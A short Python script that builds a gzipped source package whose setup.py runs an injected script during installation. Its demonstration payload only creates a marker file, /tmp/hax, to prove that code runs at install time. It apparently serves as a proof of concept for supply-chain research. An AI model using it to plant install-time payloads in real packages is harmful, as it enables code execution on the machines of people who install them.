import io
import tarfile
import textwrap
import sys

SCRIPT_TEMPLATE= """#!/usr/bin/env python

from distutils.core import setup
setup(name='{name}',
    version='1.0',
)
try:
{script}
except Exception as e:
    print(e)
"""

DEFAULT_SCRIPT = """print(42)"""

def build_setup(script, name):
    script_body = textwrap.indent(script, '    ')
    return SCRIPT_TEMPLATE.format(name=name, script=script_body)

def wrap_in_tarball(filename, contents):
    output = io.BytesIO()
    tar = tarfile.open(mode='w:gz', fileobj=output)

    contents = contents.encode('utf-8')

    fileinfo = tarfile.TarInfo(name=filename)
    fileinfo.size = len(contents)

    contents_file_obj = io.BytesIO(contents)
    tar.addfile(fileinfo, fileobj=contents_file_obj)
    tar.close()
    return output.getvalue()

def build_pkg(script=DEFAULT_SCRIPT, name="foo"):
    setup_py_contents = build_setup(script, name)
    full_filename = "{}-1.0/setup.py".format(name)
    tar = wrap_in_tarball(full_filename, setup_py_contents)
    return tar

if __name__ == "__main__":
    script="""
import os
os.system("touch /tmp/hax")
"""
    tar = build_pkg(script)
    sys.stdout.buffer.write(tar)
